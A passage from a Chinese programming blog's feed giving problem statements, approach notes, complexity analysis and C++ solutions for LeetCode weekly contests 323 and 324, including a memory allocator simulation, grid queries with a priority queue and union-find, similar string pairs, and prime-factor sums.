<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入</span><br><span class="line">[&quot;Allocator&quot;, &quot;allocate&quot;, &quot;allocate&quot;, &quot;allocate&quot;, &quot;free&quot;, &quot;allocate&quot;, &quot;allocate&quot;, &quot;allocate&quot;, &quot;free&quot;, &quot;allocate&quot;, &quot;free&quot;]</span><br><span class="line">[[10], [1, 1], [1, 2], [1, 3], [2], [3, 4], [1, 1], [1, 1], [1], [10, 2], [7]]</span><br><span class="line">输出</span><br><span class="line">[null, 0, 1, 2, 1, 3, 1, 6, 3, -1, 0]</span><br><span class="line"></span><br><span class="line">解释</span><br><span class="line">Allocator loc = new Allocator(10); // 初始化一个大小为 10 的内存数组，所有内存单元都是空闲的。</span><br><span class="line">loc.allocate(1, 1); // 最左侧的块的第一个下标是 0 。内存数组变为 [1, , , , , , , , , ]。返回 0 。</span><br><span class="line">loc.allocate(1, 2); // 最左侧的块的第一个下标是 1 。内存数组变为 [1,2, , , , , , , , ]。返回 1 。</span><br><span class="line">loc.allocate(1, 3); // 最左侧的块的第一个下标是 2 。内存数组变为 [1,2,3, , , , , , , ]。返回 2 。</span><br><span class="line">loc.free(2); // 释放 mID 为 2 的所有内存单元。内存数组变为 [1, ,3, , , , , , , ] 。返回 1 ，因为只有 1 个 mID 为 2 的内存单元。</span><br><span class="line">loc.allocate(3, 4); // 最左侧的块的第一个下标是 3 。内存数组变为 [1, ,3,4,4,4, , , , ]。返回 3 。</span><br><span class="line">loc.allocate(1, 1); // 最左侧的块的第一个下标是 1 。内存数组变为 [1,1,3,4,4,4, , , , ]。返回 1 。</span><br><span class="line">loc.allocate(1, 1); // 最左侧的块的第一个下标是 6 。内存数组变为 [1,1,3,4,4,4,1, , , ]。返回 6 。</span><br><span class="line">loc.free(1); // 释放 mID 为 1 的所有内存单元。内存数组变为 [ , ,3,4,4,4, , , , ] 。返回 3 ，因为有 3 个 mID 为 1 的内存单元。</span><br><span class="line">loc.allocate(10, 2); // 无法找出长度为 10 个连续空闲内存单元的空闲块，所有返回 -1 。</span><br><span class="line">loc.free(7); // 释放 mID 为 7 的所有内存单元。内存数组保持原状，因为不存在 mID 为 7 的内存单元。返回 0 。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= n, size, mID &lt;= 1000</code></li>
<li>最多调用 <code>allocate</code> 和 <code>free</code> 方法 <code>1000</code> 次</li>
</ul>
<h4 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/weekly-contest-323/problems/design-memory-allocator/">https://leetcode.cn/contest/weekly-contest-323/problems/design-memory-allocator/</a></p>
<h4 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h4><pre><code>直接模拟
</code></pre>
<h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><ol>
<li>由于给定的数据量太小，直接暴力模拟即可，没有什么太大的难度，这个题目出的比较失败，至少应该将数量级到达 $10^4$ 以上。</li>
<li>复杂度分析</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(nm)$，$n$ 表示给定的数组的长度， $m$ 表示调用的函数的次数。</li>
<li>空间复杂度：空间复杂度为 $O(n)$，$n$ 表示给定的数组的长度。</li>
</ul>
<h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Allocator</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Allocator</span>(<span class="type">int</span> n) &#123;</span><br><span class="line">        mem = <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">allocate</span><span class="params">(<span class="type">int</span> size, <span class="type">int</span> mID)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; mem.<span class="built_in">size</span>()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (mem[i] == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="type">int</span> start = i;</span><br><span class="line">                <span class="keyword">while</span> (i &lt; mem.<span class="built_in">size</span>() &amp;&amp; mem[i] == <span class="number">0</span>) &#123;</span><br><span class="line">                    i++;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (i - start &gt;= size) &#123;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="type">int</span> i = start; i &lt; start + size; i++) &#123;</span><br><span class="line">                        mem[i] = mID;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> start;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">free</span><span class="params">(<span class="type">int</span> mID)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; mem.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (mem[i] == mID) &#123;</span><br><span class="line">                mem[i] = <span class="number">0</span>;</span><br><span class="line">                res++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6260-矩阵查询可获得的最大分数"><a href="#6260-矩阵查询可获得的最大分数" class="headerlink" title="6260. 矩阵查询可获得的最大分数"></a>6260. 矩阵查询可获得的最大分数</h3><p>给你一个大小为 <code>m x n</code> 的整数矩阵 <code>grid</code> 和一个大小为 <code>k</code> 的数组 <code>queries</code> 。</p>
<p>找出一个大小为 <code>k</code> 的数组 <code>answer</code> ，且满足对于每个整数 <code>queres[i]</code> ，你从矩阵 <strong>左上角</strong> 单元格开始，重复以下过程：</p>
<ul>
<li>如果 <code>queries[i]</code> <strong>严格</strong> 大于你当前所处位置单元格，如果该单元格是第一次访问，则获得 1 分，并且你可以移动到所有 <code>4</code> 个方向（上、下、左、右）上任一 <strong>相邻</strong> 单元格。</li>
<li>否则，你不能获得任何分，并且结束这一过程。</li>
</ul>
<p>在过程结束后，<code>answer[i]</code> 是你可以获得的最大分数。注意，对于每个查询，你可以访问同一个单元格 <strong>多次</strong> 。</p>
<p>返回结果数组 <code>answer</code> 。</p>
<p><strong>示例 1：</strong></p>
<p><img src="https://assets.leetcode.com/uploads/2022/10/19/yetgriddrawio.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：grid = [[1,2,3],[2,5,7],[3,5,1]], queries = [5,6,2]</span><br><span class="line">输出：[5,8,1]</span><br><span class="line">解释：上图展示了每个查询中访问并获得分数的单元格。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<p><img src="https://assets.leetcode.com/uploads/2022/10/20/yetgriddrawio-2.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：grid = [[5,2,1],[1,1,2]], queries = [3]</span><br><span class="line">输出：[0]</span><br><span class="line">解释：无法获得分数，因为左上角单元格的值大于等于 3 。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>m == grid.length</code></li>
<li><code>n == grid[i].length</code></li>
<li><code>2 &lt;= m, n &lt;= 1000</code></li>
<li><code>4 &lt;= m * n &lt;= 105</code></li>
<li><code>k == queries.length</code></li>
<li><code>1 &lt;= k &lt;= 104</code></li>
<li><code>1 &lt;= grid[i][j], queries[i] &lt;= 106</code></li>
</ul>
<h4 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/weekly-contest-323/problems/maximum-number-of-points-from-grid-queries/">https://leetcode.cn/contest/weekly-contest-323/problems/maximum-number-of-points-from-grid-queries/</a></p>
<h4 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h4><blockquote>
<p> 离线查询 + 优先队列</p>
</blockquote>
<h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><ol>
<li>题目出的不是很好，感觉太过于模板的题目，即且翻译的有问题，简单的来说即给定的 $x$，从 $(0,0)$ 出发可以遍历的所有小于 $x$ 的元素的数目。</li>
<li>本题的解法有多种，首先我们只需将所有的查询从小到大进行排序，从而我们可以将矩阵从小到大进行遍历。</li>
</ol>
<ul>
<li><strong>优先队列</strong>: 我们从 $(0,0)$ 压入到优先队列，每次查询 $x$ 时，我们将队列中所有严格小于 $x$ 的元素 $(x,y)$ 弹出并计数，并同时将 $(x,y)$ 四个方向上相邻的元素压入到队列中，这样保证队列中待访问且所有符合要求的元素全部从队列中弹出。我们计数所有当前已弹出的元素为 $tot$，满足小于 $x$ 的元素的个数即为 $tot$。</li>
<li><strong>并查集</strong>: 将矩阵所有的元素按照从小到大进行排序，每次查询 $x$ 时将所有小于 $x$ 的矩阵中的元素与其相邻的边进行聚合，最后我们查询 $(0,0)$ 所在的连通单元的单元的数目即可。</li>
</ul>
<ol start="3">
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(q \log q + q \times (\log mn))$，其中 $q$ 表示查询的次数，$m,n$ 表示矩阵的行与列。</li>
<li>空间复杂度：$O(mn)$，其中 $m,n$ 表示矩阵的行与列。</li>
</ul>
<h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><ul>
<li>优先队列<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">maxPoints</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; grid, vector&lt;<span class="type">int</span>&gt;&amp; queries)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> m = grid.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> n = grid[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> k = queries.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">res</span><span class="params">(k)</span></span>;</span><br><span class="line">        vector&lt;pair&lt;<span class="type">int</span>,<span class="type">int</span>&gt;&gt; arr;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; k; i++) &#123;</span><br><span class="line">            arr.<span class="built_in">emplace_back</span>(queries[i], i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">sort</span>(arr.<span class="built_in">begin</span>(), arr.<span class="built_in">end</span>());</span><br><span class="line">        vector&lt;vector&lt;<span class="type">bool</span>&gt;&gt; <span class="built_in">visit</span>(m, <span class="built_in">vector</span>&lt;<span class="type">bool</span>&gt;(n, <span class="literal">false</span>));</span><br><span class="line">        priority_queue&lt;tuple&lt;<span class="type">int</span>,<span class="type">int</span>,<span class="type">int</span>&gt;, vector&lt;tuple&lt;<span class="type">int</span>,<span class="type">int</span>,<span class="type">int</span>&gt;&gt;, greater&lt;tuple&lt;<span class="type">int</span>,<span class="type">int</span>,<span class="type">int</span>&gt;&gt;&gt; pq;</span><br><span class="line">        pq.<span class="built_in">emplace</span>(grid[<span class="number">0</span>][<span class="number">0</span>], <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="type">int</span> tot = <span class="number">0</span>;</span><br><span class="line">        visit[<span class="number">0</span>][<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">        <span class="type">int</span> dir[<span class="number">4</span>][<span class="number">2</span>] = &#123;&#123;<span class="number">0</span>, <span class="number">-1</span>&#125;, &#123;<span class="number">0</span>, <span class="number">1</span>&#125;, &#123;<span class="number">1</span>, <span class="number">0</span>&#125;, &#123;<span class="number">-1</span>, <span class="number">0</span>&#125;&#125;;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; k; i++) &#123;</span><br><span class="line">            <span class="keyword">while</span>(!pq.<span class="built_in">empty</span>() &amp;&amp; <span class="built_in">get</span>&lt;<span class="number">0</span>&gt;(pq.<span class="built_in">top</span>()) &lt; arr[i].first) &#123;</span><br><span class="line">                <span class="keyword">auto</span> [val, x, y] = pq.<span class="built_in">top</span>();</span><br><span class="line">                pq.<span class="built_in">pop</span>();</span><br><span class="line">                tot++;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">                    <span class="type">int</span> nx = x + dir[j][<span class="number">0</span>];</span><br><span class="line">                    <span class="type">int</span> ny = y + dir[j][<span class="number">1</span>];</span><br><span class="line">                    <span class="keyword">if</span> (nx &gt;= <span class="number">0</span> &amp;&amp; nx &lt; m &amp;&amp; ny &gt;= <span class="number">0</span> &amp;&amp; ny &lt; n) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (visit[nx][ny]) <span class="keyword">continue</span>;</span><br><span class="line">                        pq.<span class="built_in">emplace</span>(grid[nx][ny], nx, ny);</span><br><span class="line">                        visit[nx][ny] = <span class="literal">true</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            res[arr[i].second] = tot;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
<li>并查集<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> dirs[<span class="number">4</span>][<span class="number">2</span>] = &#123;&#123;<span class="number">-1</span>, <span class="number">0</span>&#125;, &#123;<span class="number">1</span>, <span class="number">0</span>&#125;, &#123;<span class="number">0</span>, <span class="number">-1</span>&#125;, &#123;<span class="number">0</span>, <span class="number">1</span>&#125;&#125;;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">maxPoints</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; &amp;grid, vector&lt;<span class="type">int</span>&gt; &amp;queries)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> m = grid.<span class="built_in">size</span>(), n = grid[<span class="number">0</span>].<span class="built_in">size</span>(), mn = m * n;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 并查集模板</span></span><br><span class="line">        <span class="type">int</span> fa[mn], size[mn];</span><br><span class="line">        <span class="built_in">iota</span>(fa, fa + mn, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">fill</span>(size, size + mn, <span class="number">1</span>);</span><br><span class="line">        function&lt;<span class="type">int</span>(<span class="type">int</span>)&gt; find = [&amp;](<span class="type">int</span> x) -&gt; <span class="type">int</span> &#123; <span class="keyword">return</span> fa[x] == x ? x : fa[x] = <span class="built_in">find</span>(fa[x]); &#125;;</span><br><span class="line">        <span class="keyword">auto</span> merge = [&amp;](<span class="type">int</span> from, <span class="type">int</span> to) &#123;</span><br><span class="line">            from = <span class="built_in">find</span>(from);</span><br><span class="line">            to = <span class="built_in">find</span>(to);</span><br><span class="line">            <span class="keyword">if</span> (from != to) &#123;</span><br><span class="line">                fa[from] = to;</span><br><span class="line">                size[to] += size[from];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 矩阵元素从小到大排序，方便离线</span></span><br><span class="line">        array&lt;<span class="type">int</span>, 3&gt; a[mn];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; ++i)</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; ++j)</span><br><span class="line">                a[i * n + j] = &#123;grid[i][j], i, j&#125;;</span><br><span class="line">        <span class="built_in">sort</span>(a, a + mn);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 查询的下标按照查询值从小到大排序，方便离线</span></span><br><span class="line">        <span class="type">int</span> k = queries.<span class="built_in">size</span>(), id[k];</span><br><span class="line">        <span class="built_in">iota</span>(id, id + k, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">sort</span>(id, id + k, [&amp;](<span class="type">int</span> i, <span class="type">int</span> j) &#123; <span class="keyword">return</span> queries[i] &lt; queries[j]; &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">ans</span><span class="params">(k)</span></span>;</span><br><span class="line">        <span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i : id) &#123;</span><br><span class="line">            <span class="type">int</span> q = queries[i];</span><br><span class="line">            <span class="keyword">for</span> (; j &lt; mn &amp;&amp; a[j][<span class="number">0</span>] &lt; q; ++j) &#123;</span><br><span class="line">                <span class="type">int</span> x = a[j][<span class="number">1</span>], y = a[j][<span class="number">2</span>];</span><br><span class="line">                <span class="comment">// 枚举周围四个格子，值小于 q 才可以合并</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;d : dirs) &#123;</span><br><span class="line">                    <span class="type">int</span> x2 = x + d[<span class="number">0</span>], y2 = y + d[<span class="number">1</span>];</span><br><span class="line">                    <span class="keyword">if</span> (<span class="number">0</span> &lt;= x2 &amp;&amp; x2 &lt; m &amp;&amp; <span class="number">0</span> &lt;= y2 &amp;&amp; y2 &lt; n &amp;&amp; grid[x2][y2] &lt; q)</span><br><span class="line">                        <span class="built_in">merge</span>(x * n + y, x2 * n + y2); <span class="comment">// 把坐标压缩成一维的编号</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (grid[<span class="number">0</span>][<span class="number">0</span>] &lt; q)</span><br><span class="line">                ans[i] = size[<span class="built_in">find</span>(<span class="number">0</span>)]; <span class="comment">// 左上角的连通块的大小</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
欢迎关注和打赏，感谢支持！</li>
<li>关注我的博客: <a href="http://whistle-wind.com/">http://whistle-wind.com/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://raw.githubusercontent.com/mike-box/pic/main/202210080853104.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>力扣周赛</category>
      </categories>
      <tags>
        <tag>力扣周赛</tag>
        <tag>题解</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode contest 324</title>
    <url>/2022/12/19/%E5%8A%9B%E6%89%A3%E5%91%A8%E8%B5%9B%E9%A2%98%E8%A7%A3/88/</url>
    <content><![CDATA[<h2 id="leetcode-contest-324"><a href="#leetcode-contest-324" class="headerlink" title="leetcode  contest 324"></a>leetcode  contest 324</h2><p>周赛的第四题太过于简单了，只能说是送分题了。第三题出的挺好，是个思维题目，现在这种类型的题目希望多出来一些。</p>
<h3 id="6265-统计相似字符串对的数目"><a href="#6265-统计相似字符串对的数目" class="headerlink" title="6265. 统计相似字符串对的数目"></a>6265. 统计相似字符串对的数目</h3><p>给你一个下标从 <strong>0</strong> 开始的字符串数组 <code>words</code> 。</p>
<p>如果两个字符串由相同的字符组成，则认为这两个字符串 <strong>相似</strong> 。</p>
<ul>
<li>例如，<code>&quot;abca&quot;</code> 和 <code>&quot;cba&quot;</code> 相似，因为它们都由字符 <code>&#39;a&#39;</code>、<code>&#39;b&#39;</code>、<code>&#39;c&#39;</code> 组成。</li>
<li>然而，<code>&quot;abacba&quot;</code> 和 <code>&quot;bcfd&quot;</code> 不相似，因为它们不是相同字符组成的。</li>
</ul>
<p>请你找出满足字符串 <code>words[i]</code> 和 <code>words[j]</code> 相似的下标对 <code>(i, j)</code> ，并返回下标对的数目，其中 <code>0 &lt;= i &lt; j &lt;= word.length - 1</code> 。</p>
<p><strong>示例 1：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：words = [&quot;aba&quot;,&quot;aabb&quot;,&quot;abcd&quot;,&quot;bac&quot;,&quot;aabc&quot;]</span><br><span class="line">输出：2</span><br><span class="line">解释：共有 2 对满足条件：</span><br><span class="line">- i = 0 且 j = 1 ：words[0] 和 words[1] 只由字符 &#x27;a&#x27; 和 &#x27;b&#x27; 组成。 </span><br><span class="line">- i = 3 且 j = 4 ：words[3] 和 words[4] 只由字符 &#x27;a&#x27;、&#x27;b&#x27; 和 &#x27;c&#x27; 。 </span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：words = [&quot;aabb&quot;,&quot;ab&quot;,&quot;ba&quot;]</span><br><span class="line">输出：3</span><br><span class="line">解释：共有 3 对满足条件：</span><br><span class="line">- i = 0 且 j = 1 ：words[0] 和 words[1] 只由字符 &#x27;a&#x27; 和 &#x27;b&#x27; 组成。 </span><br><span class="line">- i = 0 且 j = 2 ：words[0] 和 words[2] 只由字符 &#x27;a&#x27; 和 &#x27;b&#x27; 组成。 </span><br><span class="line">- i = 1 且 j = 2 ：words[1] 和 words[2] 只由字符 &#x27;a&#x27; 和 &#x27;b&#x27; 组成。 </span><br></pre></td></tr></table></figure>

<p><strong>示例 3：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：words = [&quot;nba&quot;,&quot;cba&quot;,&quot;dba&quot;]</span><br><span class="line">输出：0</span><br><span class="line">解释：不存在满足条件的下标对，返回 0 。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= words.length &lt;= 100</code></li>
<li><code>1 &lt;= words[i].length &lt;= 100</code></li>
<li><code>words[i]</code> 仅由小写英文字母组成</li>
</ul>
<h4 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/weekly-contest-324/problems/count-pairs-of-similar-strings/">https://leetcode.cn/contest/weekly-contest-324/problems/count-pairs-of-similar-strings/</a></p>
<h4 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h4><pre><code>直接遍历
</code></pre>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ol>
<li>统计每个字符串中出现字符的统计情况，然后依次找到出现字符串相同的字符串组合数目即可。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(nm + n^2 \times |\Sigma|)$。其中 $n$ 表示数组的长度，$|\Sigma|$ 表示字符集，在这里 $|\Sigma| &#x3D; 26$。</li>
<li>空间复杂度：$O(|\Sigma|)$。</li>
</ul>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">similarPairs</span><span class="params">(vector&lt;string&gt;&amp; words)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = words.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="type">bool</span>&gt;&gt; <span class="built_in">cnt</span>(n, <span class="built_in">vector</span>&lt;<span class="type">bool</span>&gt;(<span class="number">26</span>));</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">auto</span> c : words[i]) &#123;</span><br><span class="line">                cnt[i][c - <span class="string">&#x27;a&#x27;</span>] = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = i + <span class="number">1</span>; j &lt; n; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (cnt[i] == cnt[j]) &#123;</span><br><span class="line">                    ans++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6266-使用质因数之和替换后可以取到的最小值"><a href="#6266-使用质因数之和替换后可以取到的最小值" class="headerlink" title="6266. 使用质因数之和替换后可以取到的最小值"></a>6266. 使用质因数之和替换后可以取到的最小值</h3><p>给你一个正整数 <code>n</code> 。</p>
<p>请你将 <code>n</code> 的值替换为 <code>n</code> 的 <strong>质因数</strong> 之和，重复这一过程。</p>
<ul>
<li>注意，如果 <code>n</code> 能够被某个质因数多次整除，则在求和时，应当包含这个质因数同样次数。</li>
</ul>
<p>返回 <code>n</code> 可以取到的最小值。</p>
<p><strong>示例 1：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：n = 15</span><br><span class="line">输出：5</span><br><span class="line">解释：最开始，n = 15 。</span><br><span class="line">15 = 3 * 5 ，所以 n 替换为 3 + 5 = 8 。</span><br><span class="line">8 = 2 * 2 * 2 ，所以 n 替换为 2 + 2 + 2 = 6 。</span><br><span class="line">6 = 2 * 3 ，所以 n 替换为 2 + 3 = 5 。</span><br><span class="line">5 是 n 可以取到的最小值。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：n = 3</span><br><span class="line">输出：3</span><br><span class="line">解释：最开始，n = 3 。</span><br><span class="line">3 是 n 可以取到的最小值。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>2 &lt;= n &lt;= 105</code></li>
</ul>
<h4 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/weekly-contest-324/problems/smallest-value-after-replacing-with-sum-of-prime-factors/">https://leetcode.cn/contest/weekly-contest-324/problems/smallest-value-after-replacing-with-sum-of-prime-factors/</a></p>
<h4 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h4><pre><code>数学
</code></pre>
<h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><ol>
<li>本质就是模拟即可，首先我们可以利用素数筛选法，找到 $n$ 以内的所有素数，然后依次进行模拟除法直到除法后的结果与原值相等为止结束。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n)$，其中 $n$ 为给定的数。最优的情况的下变换一次 $n$ 变为 $\dfrac{n}{2} + 2$，所以最多需要给定的元素变换即可</li>
<li>空间复杂度：$O(n)$，需要</li>
</ul>
<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">smallestValue</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; primer;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">bool</span>&gt; <span class="title">visit</span><span class="params">(n + <span class="number">1</span>, <span class="literal">false</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!visit[i]) &#123;</span><br><span class="line">                primer.<span class="built_in">emplace_back</span>(i);</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> j = i; j &lt;= n; j += i) &#123;</span><br><span class="line">                    visit[j] = <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="type">int</span> next = <span class="number">0</span>;</span><br><span class="line">            <span class="type">int</span> curr = n;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">auto</span> v : primer) &#123;</span><br><span class="line">                <span class="keyword">if</span> (v &gt; n) <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">while</span> ((n % v) == <span class="number">0</span>) &#123;</span><br><span class="line">                    next += v;</span><br><span class="line">                    n /= v;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (curr == next) &#123;</span><br><span class="line">                <span class="keyword">return</span> next;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                n = next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">return</span> n;</span><br><span class="line">    